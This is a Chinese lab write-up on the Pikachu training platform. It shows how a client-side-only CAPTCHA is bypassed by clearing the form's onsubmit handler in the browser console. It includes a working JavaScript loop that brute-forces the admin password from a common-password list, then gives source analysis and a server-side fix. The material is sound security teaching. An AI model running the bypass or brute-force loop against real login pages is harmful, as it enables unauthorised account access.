---
title: Pikachu 验证码绕过（on client）
date: 2026-11-04 18:40:00
tags:
  - Pikachu
  - 验证码
  - 客户端验证
  - 暴力破解
categories:
  - 网络渗透
  - Pikachu实验
---

## 流程

### ① 验证码可以直接用鼠标选中

打开页面，那个验证码可以直接用鼠标选中——它是文字，不是图片。它只是一行字符串，机器能直接读出来，起不到防自动化的作用。

### ② 先制造一次失败

验证码框里填 `xxxxx`（故意填错），用户名 `admin`，密码 `123456`，点 Login。

{% asset_img 01-client-form-error.png %}
*图 1　验证码填错，弹出「验证码输入错误！」*

页面没有跳转，请求没发出去。

### ③ 再拆掉拦截

在 Console 里执行：

```javascript
document.getElementById('bf_client').onsubmit = null;
```

{% asset_img 02-bypass-success.png %}
*图 2　拦截面被拆掉，页面跳转并显示 login success*

页面跳转，显示 login success。

### ④ 爆破

服务器不校验验证码，所以可以完全不提交 `vcode` 字段，直接连发：

```javascript
(async () => {
  const list = ['123456','000000','abc123','admin','password','12345678','qwerty','111111'];
  for (let i = 0; i < list.length; i++) {
    const r = await fetch('bf_client.php', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: new URLSearchParams({username:'admin', password:list[i], submit:'Login'})
    });
    const t = await r.text();
    console.log('第'+(i+1)+'次  ' + list[i] + '  →  ' + (t.includes('login success') ? '✓ 正确' : '✗ 密码错'));
  }
})();
```

{% asset_img 03-console-bruteforce.png %}
*图 3　8 次请求连发，第 1 次 `123456` 就命中*

## 源码分析

### ① 验证码由 JS 现场随机生成，明文写进页面那个只读输入框

{% asset_img 04-createcode-js.png %}
*图 4　`createCode()`：随机取 5 位字符，直接赋给输入框的 value*

### ② 比较发生在浏览器里，不是在服务器上

{% asset_img 05-validate-js.png %}
*图 5　`validate()`：拿输入框的值和变量 `code` 比对，决定是否放行*

### ③ PHP 只读 username 和 password

整个 PHP 文件里没有出现过 `$_POST['vcode']`。

{% asset_img 06-php-no-vcode.png %}
*图 6　`bf_client.php` 只取 `username` 和 `password`*

**结论**：HTML 和 JS 是发给浏览器的，浏览器在攻击者手里，攻击者可以任意篡改。

## 修复方法

服务端自己生成验证码、存 Session、自己比对、比完销毁。
